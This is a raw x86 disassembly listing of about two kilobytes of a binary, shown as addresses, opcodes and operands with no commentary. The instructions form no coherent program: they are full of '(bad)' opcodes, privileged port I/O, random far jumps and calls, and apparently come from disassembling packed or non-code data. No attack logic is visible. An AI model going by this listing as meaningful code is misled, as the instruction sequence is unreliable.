  41e2fb:	retf   0xa646
  41e2fe:	sub    BYTE PTR [eax],cl
  41e300:	add    DWORD PTR [esi-0x1a],0x6
  41e304:	cmp    al,0x2b
  41e306:	and    dh,BYTE PTR cs:[edi]
  41e309:	lock out 0x28,al
  41e30c:	xor    bh,BYTE PTR [esi]
  41e30e:	scas   al,BYTE PTR es:[edi]
  41e30f:	lods   al,BYTE PTR ds:[esi]
  41e310:	cmp    al,0x92
  41e312:	jno    0x41e2ec
  41e314:	jge    0x41e37b
  41e316:	rcr    al,0xc7
  41e319:	sub    al,0x4
  41e31b:	adc    cl,dl
  41e31d:	outs   dx,DWORD PTR ds:[esi]
  41e31e:	pop    eax
  41e31f:	mov    ecx,0x2a658eec
  41e324:	and    ebx,eax
  41e326:	dec    ecx
  41e327:	fnstenv [edi+ecx*8]
  41e32a:	fstp   TBYTE PTR [ebx+0x7b1887cc]
  41e330:	or     DWORD PTR [esi],ebx
  41e332:	test   DWORD PTR [ecx+0x6c],0x8c2d8b95
  41e339:	fadd   st,st(5)
  41e33b:	mov    bh,0x30
  41e33d:	mov    cs,WORD PTR [edx-0x58]
  41e340:	and    dl,BYTE PTR [ebp+edx*2+0x2]
  41e344:	xor    eax,0x76c23c81
  41e349:	cld    
  41e34a:	xchg   ebx,eax
  41e34b:	inc    ebx
  41e34c:	in     eax,dx
  41e34d:	adc    DWORD PTR fs:[eax],ecx
  41e350:	cmp    DWORD PTR [ebp-0x3d331a34],ecx
  41e356:	rol    BYTE PTR [eax+0x29386a79],1
  41e35c:	push   ebx
  41e35d:	sub    BYTE PTR [esp+edi*2-0x71],al
  41e361:	or     bh,ah
  41e363:	out    dx,al
  41e364:	sbb    eax,0xab323ff0
  41e369:	jne    0x41e36a
  41e36b:	jmp    0x8efd747e
  41e370:	scas   eax,DWORD PTR es:[edi]
  41e371:	mov    al,0x88
  41e373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e374:	loopne 0x41e3a7
  41e376:	mov    eax,0x4139bf90
  41e37b:	sar    eax,0x4c
  41e37e:	pop    edx
  41e37f:	adc    al,0x1b
  41e381:	test   al,0x81
  41e383:	scas   al,BYTE PTR es:[edi]
  41e384:	pop    ds
  41e385:	ins    DWORD PTR es:[edi],dx
  41e386:	mov    esp,0x4ad58062
  41e38b:	xor    bl,BYTE PTR [edi+0x5b]
  41e38e:	or     ebx,DWORD PTR [esi+0x6c]
  41e391:	sub    bl,BYTE PTR [eax-0x300a13df]
  41e397:	adc    ebx,DWORD PTR ss:[eax-0x44]
  41e39b:	lds    edi,FWORD PTR [edx-0xa97f156]
  41e3a1:	inc    ebp
  41e3a2:	int    0xb6
  41e3a4:	mov    ebp,0x22f51adc
  41e3a9:	xor    bl,BYTE PTR [ecx]
  41e3ab:	dec    eax
  41e3ac:	mov    fs,ebp
  41e3ae:	push   esi
  41e3af:	sub    BYTE PTR [edx],ah
  41e3b1:	or     BYTE PTR [ebx],dh
  41e3b3:	push   ss
  41e3b4:	das    
  41e3b5:	xor    DWORD PTR [eax+0x14],edi
  41e3b8:	xor    al,BYTE PTR [eax]
  41e3ba:	or     bh,BYTE PTR [ebp-0xcc95299]
  41e3c0:	or     eax,0x6b2ba563
  41e3c5:	cmp    al,0xb1
  41e3c7:	aam    0x33
  41e3c9:	imul   edx,edi,0xffffffdc
  41e3cc:	add    BYTE PTR [esi+0x79],cl
  41e3cf:	lods   eax,DWORD PTR ds:[esi]
  41e3d0:	in     al,0xae
  41e3d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3d3:	aad    0x57
  41e3d5:	push   es
  41e3d6:	jns    0x41e397
  41e3d8:	repz xchg edi,eax
  41e3da:	push   ecx
  41e3db:	or     BYTE PTR [eax+0x7364c592],ah
  41e3e1:	pop    ebp
  41e3e2:	loope  0x41e411
  41e3e4:	pop    esp
  41e3e5:	jle    0x41e401
  41e3e7:	lods   al,BYTE PTR ds:[esi]
  41e3e8:	mov    ebp,0xa5f43a58
  41e3ed:	shl    al,cl
  41e3ef:	mov    BYTE PTR [eax-0x5723fb86],ch
  41e3f5:	daa    
  41e3f6:	add    BYTE PTR [eax+ebp*4+0x40],0xf2
  41e3fb:	dec    ebp
  41e3fc:	pop    ss
  41e3fd:	jns    0x41e43d
  41e3ff:	pop    eax
  41e400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e401:	ret    0xf01a
  41e404:	int    0xe0
  41e406:	(bad)  
  41e407:	sub    ch,BYTE PTR [eax-0x2f]
  41e40a:	jmp    0x41e39e
  41e40c:	out    0x88,al
  41e40e:	add    dh,al
  41e410:	inc    edx
  41e411:	cli    
  41e412:	adc    esi,DWORD PTR [edx-0x2]
  41e415:	aam    0xc7
  41e417:	cld    
  41e418:	mov    BYTE PTR [ebx-0x3787a1e0],dl
  41e41e:	in     eax,dx
  41e41f:	cwde   
  41e420:	push   ebp
  41e421:	scas   eax,DWORD PTR es:[edi]
  41e422:	or     eax,ebp
  41e424:	nop
  41e425:	(bad)  
  41e426:	adc    al,0xe0
  41e428:	mov    ah,BYTE PTR [edx+0x7f6f7ff6]
  41e42e:	outs   dx,DWORD PTR ds:[esi]
  41e42f:	add    al,0x95
  41e431:	mov    ebp,0x4cb2740e
  41e436:	(bad)
  41e439:	push   edi
  41e43a:	cmp    BYTE PTR [ecx],dl
  41e43c:	outs   dx,DWORD PTR ds:[esi]
  41e43d:	sub    esp,DWORD PTR [eax-0x3f]
  41e440:	inc    edi
  41e441:	sub    DWORD PTR [eax-0x25197c6],eax
  41e447:	lods   al,BYTE PTR ds:[esi]
  41e448:	inc    eax
  41e449:	ds push ss
  41e44b:	loope  0x41e435
  41e44d:	mov    al,ds:0x7e0acdd
  41e452:	mov    eax,0x1f79863c
  41e457:	es out dx,eax
  41e459:	mov    eax,ds:0xb5fb3df3
  41e45e:	sahf   
  41e45f:	in     eax,dx
  41e460:	sub    al,0x62
  41e462:	inc    eax
  41e463:	adc    eax,0x7cc97ede
  41e468:	jge    0x41e414
  41e46a:	fistp  QWORD PTR [edx+0x6771ac79]
  41e470:	or     ebx,DWORD PTR [ebp+0x5f]
  41e473:	mov    bl,0xbe
  41e475:	mov    eax,ds:0x377d2ea1
  41e47a:	mov    ah,0xde
  41e47c:	(bad)  
  41e47d:	xchg   edx,eax
  41e47e:	push   edx
  41e47f:	in     al,dx
  41e480:	jg     0x41e4b1
  41e482:	mov    ch,0x91
  41e484:	jmp    0x41e43c
  41e486:	test   BYTE PTR [edi+0x450124ac],cl
  41e48c:	mov    WORD PTR [ecx-0x23],cs
  41e48f:	popa   
  41e490:	add    cl,BYTE PTR [ebx+edi*8+0x388d1f9b]
  41e497:	cmp    BYTE PTR [edx+0x7bf65f5c],ah
  41e49d:	mov    dl,0xc0
  41e49f:	xchg   edx,eax
  41e4a0:	mov    al,0x4b
  41e4a2:	psubsw mm3,QWORD PTR [ecx+0x4405ac3c]
  41e4a9:	bound  ebx,QWORD PTR ds:0x892ac680
  41e4af:	dec    ebp
  41e4b0:	mov    esp,0x2769c997
  41e4b5:	push   ebp
  41e4b6:	into   
  41e4b7:	adc    al,0x66
  41e4b9:	shl    BYTE PTR [ebx-0x52],0x23
  41e4bd:	xchg   ebp,eax
  41e4be:	int3   
  41e4bf:	fbld   TBYTE PTR [esi-0x768629e0]
  41e4c5:	sar    BYTE PTR [edx],0xbf
  41e4c8:	gs and eax,0x519dcaf9
  41e4ce:	shr    BYTE PTR [edi],0xc
  41e4d1:	xchg   cl,bl
  41e4d3:	sub    BYTE PTR [ecx-0x294cde45],0x74
  41e4da:	test   eax,0x650bbb77
  41e4df:	mov    edi,DWORD PTR [edx+0x4a]
  41e4e2:	stos   BYTE PTR es:[edi],al
  41e4e3:	(bad)  
  41e4e4:	clc    
  41e4e5:	fstp   QWORD PTR [esi]
  41e4e7:	xchg   esp,eax
  41e4e8:	dec    esi
  41e4e9:	(bad)  
  41e4ea:	jae    0x41e54b
  41e4ec:	fwait
  41e4ed:	inc    esp
  41e4ee:	repz jbe 0x41e4d0
  41e4f1:	xchg   edi,eax
  41e4f2:	(bad)  
  41e4f3:	sbb    esi,DWORD PTR [esi-0x16b79a54]
  41e4f9:	ds lahf 
  41e4fb:	fs cmp al,0x60
  41e4fe:	adc    DWORD PTR [esi],0x487ff847
  41e504:	and    al,0xbf
  41e506:	call   0xcbe2706f
  41e50b:	sar    BYTE PTR [esi+0x9],cl
  41e50e:	test   al,0xc6
  41e510:	nop
  41e511:	adc    BYTE PTR [edi],dl
  41e513:	fcmovnbe st,st(2)
  41e515:	into   
  41e516:	fnstenv [edx+0x262d37d0]
  41e51c:	cmp    eax,DWORD PTR [edi+0x5d1ae5c6]
  41e522:	mov    al,ds:0xa5d2b8d2
  41e527:	pop    es
  41e528:	mov    esp,0xa168ea26
  41e52d:	push   0x8d86f4dc
  41e532:	cmp    BYTE PTR [eax+0x23],bl
  41e535:	dec    ebp
  41e536:	fisttp QWORD PTR [ebx-0x30]
  41e539:	mov    al,0x62
  41e53b:	jl     0x41e4d8
  41e53d:	inc    eax
  41e53e:	out    dx,eax
  41e53f:	jae    0x41e5bb
  41e541:	cs loope 0x41e549
  41e544:	and    DWORD PTR [ecx],0xebbb4a86
  41e54a:	mov    ebp,0xc5a7fb8a
  41e54f:	add    BYTE PTR [edi+eax*4+0x77],0x16
  41e554:	dec    ebx
  41e555:	cwde   
  41e556:	xchg   edx,eax
  41e558:	jge    0x41e516
  41e55a:	xor    cl,al
  41e55c:	push   ebx
  41e55d:	mov    ecx,0xb25bd90f
  41e562:	rcl    DWORD PTR [esi],cl
  41e564:	cmp    al,0xe3
  41e566:	out    0x3a,eax
  41e568:	mov    cl,0xe8
  41e56a:	test   eax,0xbd65f7fb
  41e56f:	mov    eax,ds:0x517d8e89
  41e574:	inc    ebp
  41e575:	and    edi,ebx
  41e577:	sbb    BYTE PTR ds:0x3af05adb,al
  41e57d:	xchg   ebp,eax
  41e57e:	leave  
  41e57f:	push   ecx
  41e580:	inc    eax
  41e581:	popf   
  41e582:	out    dx,al
  41e583:	sbb    bh,ch
  41e585:	pusha  
  41e586:	out    dx,eax
  41e587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e588:	pusha  
  41e589:	sub    DWORD PTR [ecx],0xd45a4985
  41e58f:	rol    DWORD PTR [ebx+0x49e5a75a],1
  41e595:	mov    bh,0x46
  41e597:	sar    ch,cl
  41e599:	imul   ebx,DWORD PTR [edi+edi*8-0xa76e358],0x38
  41e5a1:	add    al,0x7a
  41e5a3:	push   ss
  41e5a4:	lods   eax,DWORD PTR ds:[esi]
  41e5a5:	sti    
  41e5a6:	and    ch,BYTE PTR [edi+0x23]
  41e5a9:	sub    eax,0x98c7cb33
  41e5ae:	call   0x571f:0xb6d3a74f
  41e5b5:	adc    eax,0x6dd77c77
  41e5ba:	sub    ah,al
  41e5bc:	dec    ebx
  41e5bd:	add    BYTE PTR [ebx],0xc3
  41e5c0:	cld    
  41e5c1:	push   cs
  41e5c2:	neg    BYTE PTR [eax+0x4306e467]
  41e5c8:	je     0x41e63f
  41e5ca:	pushf  
  41e5cb:	xor    al,0x25
  41e5cd:	ficomp DWORD PTR [ebp-0x5e]
  41e5d0:	dec    esp
  41e5d1:	jp     0x41e59d
  41e5d3:	cmp    DWORD PTR [esi+0x6a7b14a7],eax
  41e5d9:	lock adc eax,0x6c427345
  41e5df:	scas   al,BYTE PTR es:[edi]
  41e5e0:	mov    ecx,0x5a2b4ad9
  41e5e5:	sbb    al,0x2c
  41e5e7:	test   DWORD PTR [ebp+0x33],edi
  41e5ea:	clc    
  41e5eb:	push   edx
  41e5ec:	cmc    
  41e5ed:	pop    edx
  41e5ee:	adc    ebx,eax
  41e5f0:	test   edx,eax
  41e5f2:	scas   eax,DWORD PTR es:[edi]
  41e5f3:	xchg   BYTE PTR [eax],cl
  41e5f5:	add    edx,DWORD PTR ds:0x2415fc81
  41e5fb:	es popf 
  41e5fd:	add    eax,0x71c0134f
  41e602:	stos   BYTE PTR es:[edi],al
  41e603:	cli    
  41e604:	stos   DWORD PTR es:[edi],eax
  41e605:	jge    0x41e5da
  41e607:	or     BYTE PTR [eax+0x5d],ah
  41e60a:	pop    ebp
  41e60b:	nop
  41e60c:	push   ss
  41e60d:	leave  
  41e60e:	push   es
  41e60f:	in     al,0x40
  41e611:	popa   
  41e612:	sub    ebp,esi
  41e614:	and    ecx,0xffffffb0
  41e617:	cmp    cl,BYTE PTR [eax+0x57]
  41e61a:	jg     0x41e633
  41e61c:	xor    dh,BYTE PTR [edi]
  41e61e:	push   0x65968c0b
  41e623:	mov    DWORD PTR [esi+ebp*4+0x55],0x94462c2d
  41e62b:	loop   0x41e62b
  41e62d:	inc    esp
  41e62e:	mov    eax,0x3d18e593
  41e633:	push   es
  41e634:	lods   eax,DWORD PTR ds:[esi]
  41e635:	ret    
  41e636:	sub    BYTE PTR [ebp*1-0x48650bdd],dl
  41e63d:	xor    DWORD PTR [edx+0x405f0bfc],eax
  41e643:	jl     0x41e693
  41e645:	jl     0x41e681
  41e647:	scas   eax,DWORD PTR es:[edi]
  41e648:	ds loopne 0x41e69c
  41e64b:	xchg   edx,eax
  41e64c:	pop    ds
  41e64d:	lods   eax,DWORD PTR ds:[esi]
  41e64e:	dec    eax
  41e64f:	out    dx,al
  41e650:	pop    edx
  41e651:	jb     0x41e649
  41e653:	jnp    0x41e63d
  41e655:	mov    ebx,ss
  41e657:	push   ds
  41e658:	cmc    
  41e659:	shl    ebx,cl
  41e65b:	push   esi
  41e65c:	ficom  WORD PTR [ecx]
  41e65e:	xor    cl,bl
  41e660:	jmp    0x9e84:0x5708ce1c
  41e667:	xchg   BYTE PTR [eax+0x64],ah
  41e66a:	pop    ds
  41e66b:	shl    ebp,cl
  41e66d:	cmp    esp,DWORD PTR [ecx-0x6dff5452]
  41e673:	add    DWORD PTR [edx-0x71b93dd5],0x5d48c8a7
  41e67d:	in     al,0xde
  41e67f:	mov    bl,0xda
  41e681:	lds    esp,FWORD PTR [ebp+0x61]
  41e684:	out    dx,eax
  41e685:	push   esi
  41e686:	lock shl BYTE PTR [esi-0x1880800e],cl
  41e68d:	cmp    eax,0x72fe1de0
  41e692:	stos   BYTE PTR es:[edi],al
  41e693:	enter  0x636a,0xa7
  41e697:	fsub   QWORD PTR [ebp-0x3b]
  41e69a:	shr    ebp,cl
  41e69c:	jmp    0x41e6c1
  41e69e:	fstp   QWORD PTR [edx-0x66f7dc10]
  41e6a4:	jns    0x41e626
  41e6a6:	inc    ecx
  41e6a7:	add    ebx,DWORD PTR [eax]
  41e6a9:	add    ah,0xfc
  41e6ac:	mov    esi,0x9ae0a769
  41e6b1:	addr16 mov bl,0x93
  41e6b4:	jae    0x41e6f5
  41e6b6:	mov    ebx,0xa6899caa
  41e6bb:	enter  0xf8ae,0x9c
  41e6bf:	js     0x41e6c5
  41e6c1:	jmp    0x41e6f0
  41e6c3:	inc    ebx
  41e6c4:	xchg   ebp,eax
  41e6c5:	call   0xc45901b6
  41e6ca:	and    DWORD PTR [ebx],esi
  41e6cc:	sbb    ecx,ebp
  41e6ce:	dec    ecx
  41e6cf:	xchg   esi,eax
  41e6d0:	fcomi  st,st(4)
  41e6d2:	mov    esi,0xe3b92b17
  41e6d7:	in     eax,0xa9
  41e6d9:	jbe    0x41e709
  41e6db:	ret    
  41e6dc:	or     al,0x36
  41e6de:	sahf   
  41e6df:	dec    ecx
  41e6e0:	out    0x7a,eax
  41e6e2:	pop    esi
  41e6e3:	mov    ah,0x7c
  41e6e5:	call   0xb0918c6d
  41e6ea:	sbb    eax,0xcf080b6
  41e6ef:	mov    eax,ds:0x9f950c36
  41e6f4:	add    esp,DWORD PTR [ecx+edi*4]
  41e6f7:	mov    bl,0x9b
  41e6f9:	adc    cl,ch
  41e6fb:	push   esi
  41e6fc:	(bad)  
  41e6fe:	mov    esi,0x162023d6
  41e703:	fwait
  41e704:	xor    eax,0xa9204eb0
  41e709:	xor    eax,0xd710c9f0
  41e70e:	dec    edi
  41e70f:	loope  0x41e6fc
  41e711:	dec    esp
  41e712:	sbb    BYTE PTR [ecx-0x18],cl
  41e715:	rcr    DWORD PTR [ebx-0x24],cl
  41e718:	ror    BYTE PTR ds:0xcd4b84ca,0x60
  41e71f:	popf   
  41e720:	xchg   ebp,eax
  41e721:	iret   
  41e722:	lods   eax,DWORD PTR ds:[esi]
  41e723:	xor    al,0x39
  41e725:	jbe    0x41e6e7
  41e727:	sbb    DWORD PTR [ecx+0x2f],0x294f04e2
  41e72e:	dec    ebp
  41e72f:	adc    al,0xd7
  41e731:	jle    0x41e736
  41e733:	imul   ecx,DWORD PTR [eax+0x6b],0x13e1bd1e
  41e73a:	fstp   TBYTE PTR [ebp-0x5e]
  41e73d:	or     eax,0x99402d35
  41e742:	jb     0x41e776
  41e744:	fdiv   DWORD PTR [ebp-0x27fe7a0a]
  41e74a:	lods   al,BYTE PTR ds:[esi]
  41e74b:	mov    dh,0x2c
  41e74d:	mov    eax,ds:0x9f9570e3
  41e752:	shr    DWORD PTR [edx],cl
  41e754:	jns    0x41e798
  41e756:	jmp    0x41e71f
  41e758:	(bad)  
  41e759:	jl     0x41e797
  41e75b:	adc    ebp,DWORD PTR [ebx+edx*2]
  41e75e:	sub    ch,BYTE PTR [ecx+0xa2d6ae9]
  41e764:	pop    ebp
  41e765:	mov    esi,0x6fe6669d
  41e76a:	fstp   TBYTE PTR gs:[ebx+0x1f]
  41e76e:	ret    0x1f01
  41e771:	jmp    0x41e7e5
  41e773:	cmp    ebp,DWORD PTR [esi+0x57]
  41e776:	adc    al,0xf7
  41e779:	lds    esp,FWORD PTR [ebp-0x13]
  41e77c:	in     al,0xd4
  41e77e:	xchg   ebp,eax
  41e77f:	cwde   
  41e780:	pop    eax
  41e781:	fcom   QWORD PTR [eax-0xacbb576]
  41e787:	cmp    eax,0xe11a51d5
  41e78c:	push   ecx
  41e78d:	(bad)  
  41e78f:	mov    al,ds:0x7e403562
  41e794:	mov    ch,0x78
  41e796:	xor    ah,dh
  41e798:	mov    ch,0x6
  41e79a:	dec    edi
  41e79b:	add    DWORD PTR [ebx],ebp
  41e79d:	xchg   esi,eax
  41e79e:	push   edx
  41e79f:	fdiv   st,st(7)
  41e7a1:	xor    al,0x5a
  41e7a3:	rol    DWORD PTR [eax+ecx*1+0x6],cl
  41e7a7:	add    cl,al
  41e7a9:	dec    ch
  41e7ab:	outs   dx,BYTE PTR ds:[esi]
  41e7ac:	mov    edx,0x7726d3fe
  41e7b1:	(bad)  
  41e7b3:	add    eax,0x25440196
  41e7b8:	adc    ah,BYTE PTR [edx+0x7f]
  41e7bb:	adc    BYTE PTR [eax+0x2f9b17d9],dh
  41e7c1:	ins    DWORD PTR es:[edi],dx
  41e7c2:	fdivr  DWORD PTR [ecx-0x6e]
  41e7c5:	repz das 
  41e7c7:	sbb    dh,BYTE PTR [edx]
  41e7c9:	imul   bl
  41e7cb:	ins    BYTE PTR es:[edi],dx
  41e7cc:	dec    esi
  41e7cd:	mov    edx,0x4fa5a394
  41e7d2:	push   ebx
  41e7d3:	inc    ebp
  41e7d4:	add    esp,DWORD PTR [esi-0x52dbe60b]
  41e7da:	mov    edx,0x7908349b
  41e7df:	test   dl,al
  41e7e1:	inc    edi
  41e7e2:	out    dx,eax
  41e7e3:	add    edx,esp
  41e7e5:	mov    dh,BYTE PTR [ebx-0x6bd783bb]
  41e7eb:	scas   al,BYTE PTR es:[edi]
  41e7ec:	aaa    
  41e7ed:	add    esi,DWORD PTR [esi-0x71]
  41e7f0:	inc    ebx
  41e7f1:	jo     0x41e846
  41e7f3:	cs jg  0x41e7a2
  41e7f6:	stos   BYTE PTR es:[edi],al
  41e7f7:	inc    edi
  41e7f8:	mov    ds:0x20b75121,al
  41e7fd:	pusha  
  41e7fe:	sub    BYTE PTR [esi+0x218870c7],dl
  41e804:	xlat   BYTE PTR ds:[ebx]
  41e805:	fsub   st(0),st
  41e807:	inc    eax
  41e808:	adc    al,0x46
  41e80a:	das    
  41e80b:	xchg   edi,eax
  41e80c:	int3   
  41e80d:	sbb    BYTE PTR [ebx],al
  41e80f:	jo     0x41e7d3
  41e811:	push   ebx
  41e812:	mov    DWORD PTR [edi],esp
  41e814:	add    BYTE PTR ds:0x921307bf,0x1
  41e81b:	out    0xc4,al
  41e81d:	shl    DWORD PTR [edi+0x72ab2102],1
  41e823:	(bad)
  41e826:	jo     0x41e824
  41e828:	mov    eax,0x8e8472ad
  41e82d:	cwde   
  41e82e:	mov    esp,0x5f6f52c7
  41e833:	jmp    0x41e804
  41e835:	sar    edi,1
  41e837:	fsubp  st(0),st
  41e839:	or     al,0xf1
  41e83b:	jno    0x41e857
  41e83d:	mov    eax,ds:0xd7f08297
  41e842:	(bad)  
  41e843:	fimul  WORD PTR [ebp-0x7f]
  41e846:	pushf  
  41e847:	xor    eax,eax
  41e849:	into   
  41e84a:	sbb    edi,DWORD PTR [edx]
  41e84c:	ror    dl,cl
  41e84e:	pop    esi
  41e84f:	(bad)  [esi]
  41e851:	mov    ecx,0x56661dd2
  41e856:	mov    es,esp
  41e858:	mov    edx,0x4ad08836
  41e85d:	lods   eax,DWORD PTR ds:[esi]
  41e85e:	cmp    ebp,eax
  41e860:	(bad)  
  41e861:	cmc    
  41e862:	in     al,0xca
  41e864:	test   esi,0xb523b404
  41e86a:	fwait
  41e86b:	das    
  41e86c:	sub    DWORD PTR [edi+0x1f74ae13],edi
  41e872:	push   eax
  41e873:	mov    dh,0x43
  41e875:	adc    cl,BYTE PTR [eax+ebx*2+0x24]
  41e879:	dec    ebx
  41e87a:	inc    eax
  41e87b:	div    DWORD PTR [eax-0x2af8be10]
  41e881:	mov    al,0x8a
  41e883:	out    dx,eax
  41e884:	and    eax,0x5880c6d4
  41e889:	inc    edi
  41e88a:	mov    ds:0x2eef6030,al
  41e88f:	jb     0x41e8b0
  41e891:	pusha  
  41e892:	cmp    al,0x0
  41e894:	adc    dl,BYTE PTR [esi-0x2547bcc4]
  41e89a:	adc    ebx,DWORD PTR [edx+ebx*1]
  41e89d:	cmp    eax,0x30249755
  41e8a2:	fwait
  41e8a3:	mov    ebx,0x7a567c4b
  41e8a8:	in     al,0x67
  41e8aa:	je     0x41e8d4
  41e8ac:	lock mov esi,0xac9db71
  41e8b2:	jecxz  0x41e863
  41e8b4:	pushf  
  41e8b5:	dec    DWORD PTR [edi]
  41e8b7:	sti    
  41e8b8:	inc    esi
  41e8b9:	xchg   ecx,edx
  41e8bb:	jae    0x41e904
  41e8bd:	mov    dl,al
  41e8bf:	mov    eax,0xc4667de1
  41e8c4:	xchg   esi,eax
  41e8c5:	out    0x93,eax
  41e8c7:	pop    ecx
  41e8c8:	push   esp
  41e8c9:	xchg   ecx,eax
  41e8ca:	add    ecx,DWORD PTR [edx+0x497b8737]
  41e8d0:	retf   0x3adb
  41e8d3:	test   al,0xbd
  41e8d5:	and    DWORD PTR [eax-0x7830fd69],eax
  41e8db:	sbb    eax,0x359ad5be
  41e8e0:	adc    cl,BYTE PTR [edi+0x403f0d1b]
  41e8e6:	sbb    eax,0x267f0a99
  41e8eb:	fs mov ebx,0xb1f68082
  41e8f1:	stos   BYTE PTR es:[edi],al
  41e8f2:	mov    cl,0xae
  41e8f4:	out    0xe3,al
  41e8f6:	es push ds
  41e8f8:	(bad)  
  41e8f9:	loopne 0x41e919
  41e8fb:	stos   BYTE PTR es:[edi],al
  41e8fc:	int3   
  41e8fd:	pop    esp
  41e8fe:	cmp    bl,al
  41e900:	add    DWORD PTR ss:[ecx+0x1d51f7cb],edi
  41e907:	jmp    0x41e8e9
  41e909:	dec    ebx
  41e90a:	pop    ss
  41e90b:	and    ch,BYTE PTR [ebp+0x7]
  41e90e:	rcl    DWORD PTR [esi-0x4f322caf],1
  41e914:	push   DWORD PTR [edi+0x726f2a0c]
  41e91a:	lock xchg edx,eax
  41e91c:	lahf   
  41e91d:	rcl    BYTE PTR [ebx-0x5c],1
  41e920:	sub    DWORD PTR [esi-0x1a],edi
  41e923:	dec    edi
  41e924:	hlt    
  41e925:	repz lahf 
  41e927:	ins    DWORD PTR es:[edi],dx
  41e928:	popf   
  41e929:	(bad)  
  41e92a:	cmc    
  41e92b:	cwde   
  41e92c:	sub    al,0x67
  41e92e:	inc    esi
  41e92f:	loop   0x41e96c
  41e931:	or     eax,0xffffffd3
  41e934:	daa    
  41e935:	(bad)  
  41e937:	ins    BYTE PTR es:[edi],dx
  41e938:	dec    eax
  41e939:	inc    esi
  41e93a:	mov    DWORD PTR [eax-0x44],ecx
  41e93d:	pop    edi
  41e93e:	or     edi,edi
  41e940:	repz and ah,bl
  41e943:	inc    eax
  41e944:	out    dx,al
  41e945:	out    dx,eax
  41e946:	pop    edi
  41e947:	jg     0x41e8d3
  41e949:	xchg   ebp,eax
  41e94a:	ret    
  41e94b:	inc    ecx
  41e94c:	jb     0x41e95d
  41e94e:	clc    
  41e94f:	adc    bh,cl
  41e951:	xor    al,0xb7
  41e953:	es and ah,al
  41e956:	inc    ebx
  41e957:	or     al,0x9f
  41e959:	add    edx,DWORD PTR [ebx+0x4827851b]
  41e95f:	sub    al,0x9
  41e961:	cmp    eax,0x15a444ec
  41e966:	clc    
  41e967:	jmp    0x41e969
  41e969:	loope  0x41e95e
  41e96b:	cld    
  41e96c:	xchg   edx,eax
  41e96d:	push   ds
  41e96e:	popa   
  41e96f:	ret    0x75ac
  41e972:	in     eax,0xc3
  41e974:	jo     0x41e954
  41e976:	mov    edi,0xed5b65bf
  41e97b:	out    0x4b,eax
  41e97d:	pop    edx
  41e97e:	in     eax,0x87
  41e980:	inc    edx
  41e981:	leave  
  41e982:	(bad)  
  41e984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e985:	xchg   ecx,eax
  41e986:	lock pop ds
  41e988:	(bad)  
  41e989:	fs inc edx
  41e98b:	sub    al,0x34
  41e98d:	loopne 0x41e979
  41e98f:	push   esi
  41e990:	xchg   ebp,eax
  41e991:	je     0x41e954
  41e993:	mov    eax,ds:0x18ea8ef8
  41e998:	jp     0x41e9fb
  41e99a:	repz adc DWORD PTR [ebp-0x3c33e1be],ecx
  41e9a1:	or     BYTE PTR [edi+edi*8-0x77],ah
  41e9a5:	push   cs
  41e9a6:	xchg   edi,eax
  41e9a7:	aaa    
  41e9a8:	xchg   ebx,eax
  41e9a9:	je     0x41e9c9
  41e9ab:	out    dx,al
  41e9ac:	out    0xb4,eax
  41e9ae:	or     ebx,ebx
  41e9b0:	cmp    dh,BYTE PTR [ebp-0x173af5bc]
  41e9b6:	push   ebp
  41e9b7:	jmp    0x41ea01
  41e9b9:	add    DWORD PTR [edx],0xf3d2c502
  41e9bf:	stos   BYTE PTR es:[edi],al
  41e9c0:	(bad)
  41e9c4:	cdq    
  41e9c5:	test   eax,0x20686115
  41e9ca:	outs   dx,BYTE PTR es:[esi]
  41e9cc:	mov    esi,0x65ce1aa8
  41e9d1:	out    0x17,al
  41e9d3:	and    BYTE PTR [ecx+ecx*2+0x2f235b3f],bh
  41e9da:	sbb    al,0xfc
  41e9dc:	sub    BYTE PTR [ecx],ch
  41e9de:	cmp    eax,DWORD PTR [edi]
  41e9e0:	add    al,0xea
  41e9e2:	pop    ebx
  41e9e3:	mov    DWORD PTR [ecx-0x121978a0],eax
  41e9e9:	jle    0x41ea57
  41e9eb:	(bad)  
  41e9ec:	and    eax,0x33fe4edd
  41e9f1:	or     BYTE PTR [ecx],0x33
  41e9f4:	test   al,0x96
  41e9f6:	outs   dx,BYTE PTR ds:[esi]
  41e9f7:	imul   edx,DWORD PTR [eax+0x4ac49f12],0x50
  41e9fe:	sbb    ah,bl
  41ea00:	bound  esp,QWORD PTR [ebx]
  41ea02:	call   0xf538a7fb
  41ea07:	add    BYTE PTR [edx],al
  41ea09:	jno    0x41e9ac
  41ea0b:	push   ebx
  41ea0c:	cmp    al,0xa9
  41ea0e:	fwait
  41ea0f:	ror    cl,cl
  41ea11:	(bad)  
  41ea12:	out    0x5c,eax
  41ea14:	xchg   edx,eax
  41ea15:	call   0xf7698d3c
  41ea1a:	sahf   
  41ea1b:	mov    ch,0xc6
  41ea1d:	in     eax,0xa6
  41ea1f:	out    0x31,al
  41ea21:	pusha  
  41ea22:	cwde   
  41ea23:	push   ds
  41ea24:	daa    
  41ea25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea26:	push   edi
  41ea27:	stc    
  41ea28:	mov    ebx,0xabc3366b
  41ea2d:	outs   dx,DWORD PTR ds:[esi]
  41ea2e:	xor    bl,BYTE PTR [eax-0xb]
  41ea31:	or     ebp,ebp
  41ea33:	int3   
  41ea34:	std    
  41ea35:	pop    esp
  41ea36:	int    0x8a
  41ea38:	ret    0xb3e7
  41ea3b:	fild   QWORD PTR [ecx]
  41ea3d:	jnp    0x41ea85
  41ea3f:	sub    bl,bl
  41ea41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea42:	scas   al,BYTE PTR es:[edi]
  41ea43:	mov    edi,0x86ddc6c7
  41ea48:	dec    edx
  41ea49:	dec    ecx
  41ea4a:	xchg   esi,eax
  41ea4b:	aas    
  41ea4c:	pop    es
  41ea4d:	ret    
  41ea4e:	mov    ds:0x390220fe,al
  41ea53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea54:	fcmovu st,st(4)
  41ea56:	loope  0x41eac6
  41ea58:	test   al,0x80
  41ea5b:	hlt    
  41ea5c:	mov    WORD PTR [ebp-0x2daef1d6],ds
  41ea62:	sub    bl,BYTE PTR [ebp-0x4d3cc87e]
  41ea68:	jbe    0x41ea94
  41ea6a:	scas   eax,DWORD PTR es:[edi]
